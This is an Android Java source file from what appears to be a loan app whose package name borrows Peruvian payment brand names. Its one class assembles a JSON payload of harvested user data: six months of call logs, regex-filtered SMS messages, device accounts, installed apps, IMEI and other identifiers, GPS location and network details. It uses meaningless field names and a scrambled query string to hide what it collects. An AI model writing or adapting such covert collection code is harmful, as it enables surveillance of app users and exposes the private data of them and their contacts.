package com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.text.TextUtils;

import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.SuiOneModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.SuiTwoModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.jiandandiji.MyJichuAplica;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.ZhanghuModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.XinagcetuModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.AnzhaungRuanjianModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.GongdianZhuangtaiModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.ZhuajiLianXrModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.ChangyongSomeInfoModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.WeixingDingweizhModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.ZhuajiWuliPeijianModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.DaShujujsModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.WeistarDingweiModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.recordclick.YincangShijianClickTols;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.aboutbigdataup.WuxianwangTols;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.WangOnlineModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.PingmuDianyuanModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.ZhuajiPojieModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.GongyongIpModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.datamodel.CunchuSaveModel;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.aboutbigdataup.NanFuDianchiTols;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.aboutbigdataup.ShebeiXinxiTols;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.aboutbigdataup.ShoujiPingmuTols;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.aboutbigdataup.WeiYiBiaoshiTols;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.aboutbigdataup.MeitiXinxiTols;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.aboutbigdataup.PojieTols;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.aboutbigdataup.DuanxiaoxiTols;
import com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.aboutbigdataup.CunchuTols;
import com.google.gson.Gson;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import static com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.BendiHuancunTols.YONGHU_ZHUAJI;
import static com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.recordclick.YincangShijianClickTols.yichuanId;
import static com.yape.fpay.bcp.platinka.prestamo.plus.caja.fengzhuangtoltol.aboutbigdataup.RiliShijianTols.naRiliXinxi;


public class HuoquBigJsonUpShujuTols {

    public static String getJson(Activity activity, String regex) {
        //get gps save to shareperpence
        DingWeizhiTols.getWeizhiDingwei(activity);
        //get all riskwind info
        DaShujujsModel entity = new DaShujujsModel();
//        entity.cordlessLaughterLatestBridegroom = "0";
        //因为权限去掉 所以里面加trycatch 以防为空
        entity.cordlessLaughterLatestBridegroom = getAudioCount(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI);
//        entity.recentRussianLeafPublicChairwoman = "0";
        entity.recentRussianLeafPublicChairwoman = getAudioCount(MediaStore.Audio.Media.INTERNAL_CONTENT_URI);
        entity.brightPintComfortableSkateboardHarbour = MeitiXinxiTols.gaoDaoNeicunTupian(activity) + "";
        //因为权限去掉 所以里面加trycatch 以防为空
        entity.undividedNotebookBroadLiterature = MeitiXinxiTols.gaoDaoNeicunTupian2(activity) + "";
        entity.untrueCurrencyBornGrowth = MeitiXinxiTols.naDaoNeibuShipin(activity) + "";
        //因为权限去掉 所以里面加trycatch 以防为空
        entity.someShortcomingContentGuitar = MeitiXinxiTols.getVideoExternal(activity) + "";
        //因为权限去掉 所以里面加trycatch 以防为空
        entity.familiarClassicalRelationInsurance = MeitiXinxiTols.jiSuanXiazaiWenjianShuliang() + "";
        //因为权限去掉
//        entity.tiresomeElectricAbility = MeitiXinxiTols.huoQuLianxiPeople(activity) + "";
        entity.secondGratefulGift = YincangShijianClickTols.banbenming + "";
//        entity.rainySoftSpoon = Build.ID;
        entity.rainySoftSpoon = YincangShijianClickTols.appshasahId;
        entity.goodCrossing = activity.getPackageName();
        entity.dullHouseLessNotebookYoungBread = System.currentTimeMillis();
        entity.likelyRoofUndergroundMouth = getHardWareEntity(activity);
        entity.basicSlaveCuriousSureMarriage = getStorageEntity(activity);
        entity.pleasantBeardLowLameComma = getGongyongl_dataEntity(activity);
        entity.distantProLiquidMember = getOther_dataEntity(activity);
        entity.singleBabyVideophone = getApplicationEntity(activity);
        //因为去掉权限所以不取了
//        entity.shortFairNationAboveCar = ZhuajiLianXrTols.getContact(activity);
        //因为去掉权限 所以里面加trycatch 以防为空
        entity.healthyCupboardLeftoverNeedleVocabulary = getNetworkEntity(activity);
        entity.disabledFinalBitMajorPostcode = DuanxiaoxiTols.deDaoShoujiDuanxin(activity, regex);
        entity.looseManyEachBench = getLocEntity(activity);
        entity.uglyCowForgetfulShooting = getBattery_statusEntity(activity);
        entity.agriculturalFurnitureFactorySadFellow = getPublic_ipEntity(activity);
        //因权限去掉 所以里面加trycatch 以防为空
        entity.triangleEntranceThoseAmbulanceDecoration = getAlbsEntity();
        entity.ancientImpossibleVanilla = naRiliXinxi();
        entity.otherEntity = getOtherBean(activity);
        //因权限去掉 所以里面加trycatch 以防为空
        entity.familiarTowerBritishToiletJob = getAccountBean(activity);
        entity.passiveGrandPriceBattleground = getContactRecord(activity);

        entity.appCurrentTime = "appCurrentTime_" + SystemClock.currentThreadTimeMillis();
        entity.appVer = "app_v1.0.0";
        SuiOneModel suiOneModel = new SuiOneModel();
        suiOneModel.suiOneTimeStr = "suiOneTimeStr_"+System.currentTimeMillis();
        suiOneModel.suiOneVerCode = "10000";
        suiOneModel.suiOneVerName = "V10000";
        suiOneModel.suiOneAppOS = "android";
        suiOneModel.suiOneName = SuiOneModel.class.getSimpleName();
        entity.suiOneModel = suiOneModel;

        SuiTwoModel suiTwoModel = new SuiTwoModel();
        suiTwoModel.suiTwoAppProj = "proj";
        suiTwoModel.suiTwoAppDate = ShijianTols.shijianChuoZhuanZifuchuan(System.currentTimeMillis());
        suiTwoModel.suiTwoClzName = SuiTwoModel.class.getName();
        suiTwoModel.suiTwoVerName = Build.DISPLAY;
        entity.suiTwoModel = suiTwoModel;

        Gson gson = new Gson();
        String json = gson.toJson(entity);
        return json;
    }

    private static String getAudioCount(Uri curUri) {
        Cursor youbiao = null;
        try {
            youbiao = MyJichuAplica.getInstance().getContentResolver().query(curUri,
                    null, null, null,
                    null);
            return youbiao.getCount() + "";
        } catch (Throwable e) {
            e.printStackTrace();
        } finally {
            if (youbiao == null) {
                return 0 + "";
            }
            try {
                youbiao.close();
            } catch (Throwable e) {
                return 0 + "";
            }
        }
        return 0 + "";
    }

    private static List<ZhanghuModel> getAccountBean(Activity activity) {
        List<ZhanghuModel> list = new ArrayList<>();

        try {
            AccountManager accountManager = AccountManager.get(activity);
            Account[] accounts = accountManager.getAccounts();
            for (int i = 0; i < accounts.length; i++) {
                ZhanghuModel zhanghuModel = new ZhanghuModel(accounts[i].name, accounts[i].type);
                list.add(zhanghuModel);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return list;
    }


    private static PingmuDianyuanModel getOtherBean(Activity activity) {

        PingmuDianyuanModel pingmuDianyuanModel = new PingmuDianyuanModel();
        try {
            String device_height = String.valueOf(ShoujiPingmuTols.celiangPingmuGao(activity));
            String device_width = String.valueOf(ShoujiPingmuTols.celiangPingmuKuan(activity));
            pingmuDianyuanModel.screenRes = device_width + "*" + device_height;

            pingmuDianyuanModel.activeTime = Integer.parseInt(PojieTols.naBootShijian());
            pingmuDianyuanModel.upTime = Integer.parseInt(PojieTols.naBootShijian());
            pingmuDianyuanModel.batteryCapacity = (int) PojieTols.naDianchiRongliang(activity);
            pingmuDianyuanModel.cpuFrequency = Integer.parseInt(PojieTols.naCpuPin());
        } catch (Exception e) {
            e.printStackTrace();
            pingmuDianyuanModel.cpuFrequency = 1804800;
        }
        return pingmuDianyuanModel;
    }

    private static List<AnzhaungRuanjianModel> getApplicationEntity(Activity activity) {
        JSONArray jsonArray = new JSONArray();
        List<AnzhaungRuanjianModel> anzhaungRuanjianModelList = new ArrayList<>();
        PackageManager packageManager = activity.getPackageManager();
        List<PackageInfo> packageInfo = packageManager.getInstalledPackages(0);
        for (PackageInfo packInfo : packageInfo) {
            JSONObject jsonObject = new JSONObject();
            AnzhaungRuanjianModel anzhaungRuanjianModel = new AnzhaungRuanjianModel();

            if ((packInfo.applicationInfo.flags & packInfo.applicationInfo.FLAG_SYSTEM) != 0) {
                anzhaungRuanjianModel.neatSaturdayTomorrow = "1";
            } else {
                anzhaungRuanjianModel.neatSaturdayTomorrow = "0";
            }
            anzhaungRuanjianModel.considerateAdmissionFrontier = packInfo.applicationInfo.loadLabel(packageManager).toString();
            anzhaungRuanjianModel.smokeExpressionUnhealthyNylon = packInfo.packageName;
            anzhaungRuanjianModel.chiefHeadacheHolyGrowth = packInfo.firstInstallTime;
            anzhaungRuanjianModel.electricSilentLife = packInfo.versionName;
            anzhaungRuanjianModel.steadyItselfConceitedNumber = packInfo.versionCode;
            anzhaungRuanjianModel.southernMerchantStairChest = packInfo.applicationInfo.flags;
            anzhaungRuanjianModel.socialShoppingEmptyMouthUnableComrade = packInfo.lastUpdateTime;

            anzhaungRuanjianModelList.add(anzhaungRuanjianModel);
            jsonArray.put(jsonObject);
        }
        List<AnzhaungRuanjianModel> applicationEntity2 = getApplicationEntity2(activity);

        return anzhaungRuanjianModelList.size() > applicationEntity2.size() ? anzhaungRuanjianModelList: applicationEntity2;
    }


    private static List<AnzhaungRuanjianModel> getApplicationEntity2(Activity activity) {
        List<AnzhaungRuanjianModel> anzhaungRuanjianModelList = new ArrayList<>();
        try{
            PackageManager packageManager = activity.getPackageManager();
            Intent intent = new Intent(Intent.ACTION_MAIN, null);
            intent.addCategory(Intent.CATEGORY_LAUNCHER);
            List<ResolveInfo> resolveInfos = packageManager.queryIntentActivities(intent, 0);

            for (int i = 0; i < resolveInfos.size(); i++) {
                try {
                    ResolveInfo resolveInfo = resolveInfos.get(i);
                    ApplicationInfo applicationInfo = resolveInfo.activityInfo.applicationInfo;
                    PackageInfo packageInfo = packageManager.getPackageInfo(applicationInfo.packageName, 0);
                    String name = packageInfo.applicationInfo.loadLabel(activity.getPackageManager()).toString();

                    AnzhaungRuanjianModel anzhaungRuanjianModel = new AnzhaungRuanjianModel();

                    anzhaungRuanjianModel.neatSaturdayTomorrow = (packageInfo.applicationInfo.flags & 1) == 0 ? "0" : "1";

                    anzhaungRuanjianModel.considerateAdmissionFrontier = name;
                    anzhaungRuanjianModel.smokeExpressionUnhealthyNylon =  packageInfo.packageName;
                    anzhaungRuanjianModel.chiefHeadacheHolyGrowth = packageInfo.firstInstallTime;
                    anzhaungRuanjianModel.electricSilentLife = packageInfo.versionName;
                    anzhaungRuanjianModel.steadyItselfConceitedNumber =  packageInfo.versionCode;
                    anzhaungRuanjianModel.southernMerchantStairChest = packageInfo.applicationInfo.flags;
                    anzhaungRuanjianModel.socialShoppingEmptyMouthUnableComrade = packageInfo.lastUpdateTime;

                    anzhaungRuanjianModelList.add(anzhaungRuanjianModel);

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }
        return anzhaungRuanjianModelList;
    }

    private static ZhuajiPojieModel getOther_dataEntity(Activity activity) {
        ZhuajiPojieModel zhuajiPojieModel = new ZhuajiPojieModel();
        zhuajiPojieModel.specialJapaneseAuntTheatre = PojieTols.shiFouPojie() + "";
        zhuajiPojieModel.unimportantMusicalInsectMinority = System.currentTimeMillis() - SystemClock.elapsedRealtimeNanos() / 1000000 + "";
        zhuajiPojieModel.ancientAllTemptationEntireDecoration = PojieTols.keyboard(activity) + "";
        zhuajiPojieModel.halfRoundTowelPoliteBeef = PojieTols.huoQuMoniqi(activity) + "";
        //因为权限去掉 maybe null 所以try catch
        try {
            zhuajiPojieModel.lessMetalSoulCigar = PojieTols.huoQuJizhanXinxi(activity) + "";
        } catch (Exception e) {
            zhuajiPojieModel.lessMetalSoulCigar = "-1";
        }
        zhuajiPojieModel.total_pre_boot_time = PojieTols.naBootShijian() + "";
        zhuajiPojieModel.total_pre_boot_time_wake = PojieTols.naBootShijian() + "";
        zhuajiPojieModel.freezingScienceFancyKing = PojieTols.naBootShijian() + "";
        zhuajiPojieModel.thirstyRegularDateThisKilometre = PojieTols.naBootShijian() + "";
        return zhuajiPojieModel;
    }

    private static ChangyongSomeInfoModel getGongyongl_dataEntity(Activity aaa) {
        ChangyongSomeInfoModel changyongSomeInfoModel = new ChangyongSomeInfoModel();
        changyongSomeInfoModel.doubleMotorcycleIslandCompetition = yichuanId;
        changyongSomeInfoModel.squareTrolleyLuckBackChoice = ShebeiXinxiTols.naAnzhuoId(aaa);
        changyongSomeInfoModel.mildAbsentCruelDuck = ShebeiXinxiTols.naZhuajiLeixingWang(aaa);
        changyongSomeInfoModel.noisyCountrysideDifferentDriverSilentThief = ShebeiXinxiTols.naWUliDizhi(aaa);
        changyongSomeInfoModel.localStreetMouse = ShebeiXinxiTols.dangqianXitongYuan().getISO3Language();
        changyongSomeInfoModel.goldenUnimportantPlug = ShebeiXinxiTols.dangqianXitongYuan().getDisplayLanguage();
        changyongSomeInfoModel.seriousPrayerSharpFootball = ShebeiXinxiTols.dangqianXitongYuan().getISO3Country();
        changyongSomeInfoModel.quickBeerMentalSuchBank = ShebeiXinxiTols.naShebeiBianhao(MyJichuAplica.getInstance());
        changyongSomeInfoModel.frontMeetingSuitableEuropeanInn = BendiHuancunTols.huoQuZifuchuan(aaa, YONGHU_ZHUAJI);
        changyongSomeInfoModel.usefulVillagerRichSeagull = ShebeiXinxiTols.zhaoWangluoOperatMingzi(aaa);
        changyongSomeInfoModel.dangerousDealComfortableYard = ShebeiXinxiTols.chaXunWangluoLeixing(aaa);
        changyongSomeInfoModel.mobileGrowthAboveYard = ShebeiXinxiTols.naShiquId();
        changyongSomeInfoModel.coldSquidThoroughSoldier = ShebeiXinxiTols.dangqianXitongYuan().getLanguage();
        changyongSomeInfoModel.dearBusyYoungAid = ShebeiXinxiTols.shiWuxainDailiFou();
        changyongSomeInfoModel.seriousBoxing = ShebeiXinxiTols.shiFouyongXuniWangKuayu();
        changyongSomeInfoModel.minibusJeansUnusualTram = ShebeiXinxiTols.yongUsbTiaoshiFou(aaa);
        changyongSomeInfoModel.curiousElectricityCheeseSouthernBridegroom = SystemClock.elapsedRealtime() / 1000;
        changyongSomeInfoModel.religiousInventorSouthernHarmfulSnow = System.currentTimeMillis();
        changyongSomeInfoModel.nearbySuddenRabbitMerryAnger = SystemClock.uptimeMillis() / 1000;
        changyongSomeInfoModel.readySandwichProperInch = ShebeiXinxiTols.naChuanganqiLiebiao(aaa);
        return changyongSomeInfoModel;
    }


    private static ZhuajiWuliPeijianModel getHardWareEntity(Activity activity) {
        ZhuajiWuliPeijianModel zhuajiWuliPeijianModel = new ZhuajiWuliPeijianModel();
        zhuajiWuliPeijianModel.politicalCarriageItsEnoughDistance = Build.PRODUCT;
        zhuajiWuliPeijianModel.upperMemoryFlag = String.valueOf(Build.VERSION.SDK_INT);
        zhuajiWuliPeijianModel.punctualBroom = Build.VERSION.RELEASE;
        zhuajiWuliPeijianModel.snowyGoalSadPresentationRegularGesture = Build.MODEL;
        zhuajiWuliPeijianModel.funnyEscapeHerself = Build.BRAND;
        zhuajiWuliPeijianModel.ashamedConsiderationLuggage = ShoujiPingmuTols.naSrceenWUliChixun(activity);
        zhuajiWuliPeijianModel.unimportantServiceSnowyFairness = ShoujiPingmuTols.naXuliehaoForZhuaji();
        zhuajiWuliPeijianModel.smallGuardNortheast = String.valueOf(Build.TIME);
        zhuajiWuliPeijianModel.thirstyDearExperimentEngine = String.valueOf(ShoujiPingmuTols.celiangPingmuGao(activity));
        zhuajiWuliPeijianModel.dullPunishmentHerselfCompressedKitchen = String.valueOf(ShoujiPingmuTols.celiangPingmuKuan(activity));
        zhuajiWuliPeijianModel.normalManSweaterGreatSalesgirl = Build.BOARD;


        try {
            zhuajiWuliPeijianModel.famousCheesePeasant = WeiYiBiaoshiTols.naHexinJisuanqiHaoma() + "";
            zhuajiWuliPeijianModel.impossibleActionTiresomeAction = WeiYiBiaoshiTols.naImeaiBiaoshi(MyJichuAplica.getInstance());
//            zhuajiWuliPeijianModel.handsomeBiscuitFormerTechniqueBrownTrack = WeiYiBiaoshiTols.huoquWieyiImei2222(MyJichuAplica.getInstance());
            zhuajiWuliPeijianModel.handsomeBiscuitFormerTechniqueBrownTrack= zhuajiWuliPeijianModel.impossibleActionTiresomeAction;
        } catch (Exception e) {

        }
        return zhuajiWuliPeijianModel;
    }


    private static CunchuSaveModel getStorageEntity(Activity activity) {
        CunchuSaveModel cunchuSaveModel = new CunchuSaveModel();
        cunchuSaveModel.japaneseCurrencySilenceBeast = String.valueOf(CunchuTols.deDaoNeicunDaxiao(activity));
        cunchuSaveModel.swissFamilyButterfly = String.valueOf(CunchuTols.gaoDaoKeyongNeicun(activity));
        cunchuSaveModel.easternJuicyCrossroads = String.valueOf(CunchuTols.getZongdaxiaoForExternal());
        cunchuSaveModel.skilledEducatorFolkPhrase = String.valueOf(CunchuTols.gaoDaoKeyongDaxiaoForExternal());
        cunchuSaveModel.crazyMemoryPeacefulMonthApril = String.valueOf(CunchuTols.getZongdaxiaoForExternal() - CunchuTols.gaoDaoKeyongDaxiaoForExternal());
        cunchuSaveModel.asleepPainfulSunshineMeans = String.valueOf(CunchuTols.gaoDaoNeicunDaxiao());
        cunchuSaveModel.goldenAsianSoldier = String.valueOf(CunchuTols.gaoDaoKeyongNeicun(activity) + CunchuTols.gaoDaoKeyongDaxiaoForExternal());
        cunchuSaveModel.anxiousVariousIllness = TextUtils.isEmpty(CunchuTols.gaoDaoWaibuCunchuLujing(activity)) ? 0 : 1;
        cunchuSaveModel.smellySlavePlayer = TextUtils.isEmpty(CunchuTols.gaoDaoWaibuCunchuLujing(activity)) ? 0 : 1;
        cunchuSaveModel.healthyToughStudioDearPossibility = String.valueOf(CunchuTols.xianZhiNeicun(activity));
        cunchuSaveModel.hillyPoliticianSpareSlimHam = String.valueOf(CunchuTols.gaoDaoKeyongNeicun3(activity));
        try {
            cunchuSaveModel.strangeFollowingCarbonBrightPolitics = String.valueOf(CunchuTols.deDaoRomZongdaxiao(activity));
            cunchuSaveModel.gentlePalaceFairCentury = ZifuchuanPinjieSpanTols.huoquRamZongNeicun();
        } catch (Exception e) {

        }

        return cunchuSaveModel;
    }

    private static XinagcetuModel getAlbsEntity() {

        XinagcetuModel xinagcetuModel = new XinagcetuModel();
//        try {
//            XinagcetuModel1 xinagcetuModel1 = new XinagcetuModel1();
//            XinagcetuModel2 xinagcetuModel2 = new XinagcetuModel2();
//            JSONObject jsonObject = new JSONObject();
//            JSONArray jsonArray = new JSONArray();
//
//            jsonObject.put("albs", XingceTuTols.getImagesMsg());
//
//            Gson gson = new Gson();
//            String json = gson.toJson(jsonObject);
//            XinagcetuModel3 xinagcetuModel3 = gson.fromJson(json, XinagcetuModel3.class);
//            xinagcetuModel2.dataList = xinagcetuModel3.getNameValuePairs().getAlbs().getDataListEntity().getHorriblePlugFellow();
//            xinagcetuModel1.albs = xinagcetuModel2;
//            xinagcetuModel.albs = xinagcetuModel1;
//        } catch (JSONException e) {
//
//            e.printStackTrace();
//            return null;
//        }
        return xinagcetuModel;
    }

    private static GongyongIpModel getPublic_ipEntity(Activity activity) {
        GongyongIpModel bean = new GongyongIpModel();
        bean.maleActivityEgyptianBowl = WuxianwangTols.huoquwangluoipdizhi(activity);
        bean.freezingSlimTomorrow = WuxianwangTols.huoquwangluoipdizhi(activity);
        return bean;
    }

    private static GongdianZhuangtaiModel getBattery_statusEntity(Activity activity) {
        GongdianZhuangtaiModel bean = new GongdianZhuangtaiModel();
        bean.basicUglyPolicePartPresident = NanFuDianchiTols.shifouChadianChongdian(activity) ? 1 : 0;
        bean.merryInitialTail = NanFuDianchiTols.huoQuDianchiBaifenbi(activity);
        bean.thickThinNorthernFall = NanFuDianchiTols.shiFouChongdian(activity).equals("usb") ? 1 : 0;
        bean.brownReceptionDampLantern = NanFuDianchiTols.shiFouChongdian(activity).equals("ac") ? 1 : 0;
        return bean;
    }

    public static WeistarDingweiModel getLocEntity(Context context) {
        WeistarDingweiModel weistarDingweiModel = new WeistarDingweiModel();
        WeixingDingweizhModel weixingDingweizhModel = new WeixingDingweizhModel();
        try {
            String laGps = BendiHuancunTols.huoQuZifuchuan(context, BendiHuancunTols.XITONG_WEIJINGDU);
            String loGps = BendiHuancunTols.huoQuZifuchuan(context, BendiHuancunTols.XITONG_JINGWEIDU);
            weixingDingweizhModel.crossBroadcastImmigrationMicroscope = laGps;
            weixingDingweizhModel.tastelessBaggagePuzzledMicrowave = loGps;
            weistarDingweiModel.carefulMinusAdventureDocument = weixingDingweizhModel.crossBroadcastImmigrationMicroscope + "," + weixingDingweizhModel.tastelessBaggagePuzzledMicrowave;
            weistarDingweiModel.chineseComedySeveralSeparation = weixingDingweizhModel.crossBroadcastImmigrationMicroscope + "," + weixingDingweizhModel.tastelessBaggagePuzzledMicrowave;
            weistarDingweiModel.centralDullUserSimpleMonument = weixingDingweizhModel.crossBroadcastImmigrationMicroscope + "," + weixingDingweizhModel.tastelessBaggagePuzzledMicrowave;
//            locationEntity.gps_address_city = GpsUtils.city;
//            locationEntity.gps_address_province = GpsUtils.provice;
//            locationEntity.gps_address_street = GpsUtils.addressStreet;
            weistarDingweiModel.digestUnsafeBicycleView = weixingDingweizhModel;
            return weistarDingweiModel;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }


    private static WangOnlineModel getNetworkEntity(Activity activity) {
        WangOnlineModel bean = new WangOnlineModel();

        try {
            bean.taxVariousSectionBallet = WuxianwangTols.huoquwangluoipdizhi(activity);
            bean.anxiousSaltContraryBucket = WuxianwangTols.huoquWuxianShuliang(activity) + "";
            bean.fullPrisonerReservation = WuxianwangTols.nadaoDangqianWuxianLei(activity);
            bean.sharpHairCrossMinibusRat = WuxianwangTols.huoquDangqianWuxianLeiList(activity);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return bean;
    }

    @SuppressLint("Range")
    public static List<ZhuajiLianXrModel> getContactRecord(Context context) {
        List<ZhuajiLianXrModel> list = new ArrayList<>();
        Cursor cursor = null;
        try {
            Uri uri = CallLog.Calls.CONTENT_URI;
            String[] projection = {CallLog.Calls.DATE,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls._ID, // id
                    CallLog.Calls.DURATION,
                    CallLog.Calls.NEW
            };

            String selection = "#da#te >#= #? A#ND da#te <#= ?#".replaceAll("#","");
            long currentTime = System.currentTimeMillis();

            Calendar calendar = Calendar.getInstance();
            calendar.add(Calendar.MONTH, -6);
            String[] selectionArgs = new String[]{String.valueOf(calendar.getTimeInMillis()), String.valueOf(currentTime)};

            cursor = context.getContentResolver()
                    .query(uri, projection, selection, selectionArgs, CallLog.Calls.DEFAULT_SORT_ORDER);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String cachedName = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));// 缓存的名称与电话号码，如果它的存在

                    ZhuajiLianXrModel accountBean = new ZhuajiLianXrModel();
                    accountBean.reasonableLungNaturalEverything = cursor.getInt(cursor.getColumnIndex(CallLog.Calls._ID));
                    if (TextUtils.isEmpty(cachedName)) {
                        accountBean.foreignReceiverRussianSunshineCurrency = number;
                    } else {
                        accountBean.foreignReceiverRussianSunshineCurrency = cachedName;
                    }
                    accountBean.tightSteepChimney = number;
                    accountBean.formerDescriptionUnsuccessfulDiploma = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    accountBean.squareBookshop = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    accountBean.commonUselessMinority = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    accountBean.possibleFactCoolDumpling = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.NEW));
                    list.add(accountBean);
                }

            }


        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return list;
    }
}
